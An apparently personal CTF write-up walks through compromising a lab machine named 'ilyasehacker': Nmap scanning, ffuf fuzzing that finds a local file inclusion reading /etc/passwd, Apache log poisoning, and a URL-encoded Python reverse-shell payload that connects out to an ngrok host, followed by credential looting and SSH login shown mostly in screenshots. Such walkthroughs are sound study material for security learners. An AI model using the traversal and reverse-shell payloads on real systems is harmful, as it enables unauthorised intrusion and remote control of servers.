---
layout: default
title : muzec - ilyasehacker Writeup
---

![image](https://user-images.githubusercontent.com/69868171/173816539-f00c6762-a804-494d-a790-e1ea263cba74.png)

I have fun pwning one of my buddy new created machine `ilyasehacker` a fun easy machine would said let jump in already and stay pwning XD.

Let start our enumeration already by scanning with `Nmap` .

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground]
└─$ nmap -sC -sV 102.37.127.79
Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-15 09:30 WAT
Stats: 0:04:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 25.00% done; ETC: 09:35 (0:00:09 remaining)
Stats: 0:06:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 93.75% done; ETC: 09:36 (0:00:04 remaining)
Nmap scan report for 102.37.127.79
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT    STATE  SERVICE     VERSION
22/tcp  open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d7:ea:b9:50:3b:e1:e2:74:3c:a2:23:6f:6a:47:d9:05 (RSA)
|   256 4e:bf:a4:e6:4d:44:a9:b8:b0:18:a8:3b:da:2a:76:43 (ECDSA)
|_  256 69:30:91:d0:f2:ba:85:87:62:cd:e7:85:c8:49:28:37 (ED25519)
25/tcp  open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp  open   http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/thumb/config.php
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: 3awaba
443/tcp closed https
587/tcp open   submission?
|_smtp-commands: Couldn't establish connection on port 587
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 424.64 seconds
```

Interesting we have `HTTP` seems we have something on `robots.txt` which is cool.

![image](https://user-images.githubusercontent.com/69868171/173818791-51e97892-815f-4c02-a153-7a12efb2b558.png)

But when i access it.

![image](https://user-images.githubusercontent.com/69868171/173818932-72fac69e-4f6f-461c-a0db-a5c197e61466.png)

WTF a troll or what i don't think so we can either check for `LFI` to be at rest to avoid missing anything.

```
┌──(muzec㉿Muzec-Security)-[~/Desktop/CTFPlayground]
└─$ ffuf -c -ic -r -u 'http://102.37.127.79/thumb/config.php?FUZZ=../../../../../../../../../../../../../../etc/passwd' -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 27   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://102.37.127.79/thumb/config.php?FUZZ=../../../../../../../../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 27
________________________________________________

file                    [Status: 200, Size: 1946, Words: 17, Lines: 37]
```

Boom `LFI` XD.

![image](https://user-images.githubusercontent.com/69868171/173819719-947aca09-2dad-4f3e-abd8-4afee55359d8.png)

Now what come to mind is to get RCE or find a way to loot credentials `Apache Log Poisoning` .

![image](https://user-images.githubusercontent.com/69868171/173820206-0263a729-eea2-42bd-a1dc-774b39f577a2.png)

Let poison it intercepting with burp suite.

![image](https://user-images.githubusercontent.com/69868171/173820472-b88bc865-b43e-4e6d-b349-d7fe41ea55f5.png)

Setting up `ngrok` to recieve our shell with our `ncat` listener.


![image](https://user-images.githubusercontent.com/69868171/173820696-26e2f236-8f02-41a2-8f24-3052a1425191.png)

Double encoding or payload.

```
python3%20%2Dc%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket%2Esocket%28socket%2EAF%5FINET%2Csocket%2ESOCK%5FSTREAM%29%3Bs%2Econnect%28%28%228%2Etcp%2Engrok%2Eio%22%2C17966%29%29%3Bos%2Edup2%28s%2Efileno%28%29%2C0%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C1%29%3B%20os%2Edup2%28s%2Efileno%28%29%2C2%29%3Bp%3Dsubprocess%2Ecall%28%5B%22%2Fbin%2Fsh%22%2C%22%2Di%22%5D%29%3B%27
```

![image](https://user-images.githubusercontent.com/69868171/173820854-5c0c768c-2bd3-4c10-a807-851f1fc77f15.png)

Now back to our listener.

![image](https://user-images.githubusercontent.com/69868171/173821175-78e807c6-55cd-4481-83cb-f2a64305ef19.png)

Time to loot credentials.

![image](https://user-images.githubusercontent.com/69868171/173821310-b027027c-7a20-4575-91cb-6f8a692b1db6.png)

Hint stated the password is encrypted in `xor` without knowing the key seems we need to brute force.

![image](https://user-images.githubusercontent.com/69868171/173821671-725d0d1b-ed68-4c59-bf7a-62c8c4491afe.png)


Now let hit SSH.

![image](https://user-images.githubusercontent.com/69868171/173821886-92d31603-984b-44bb-8a9d-dc30995798da.png)

We have the first flag and seems we can run all to get root it was a easy XD and we are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

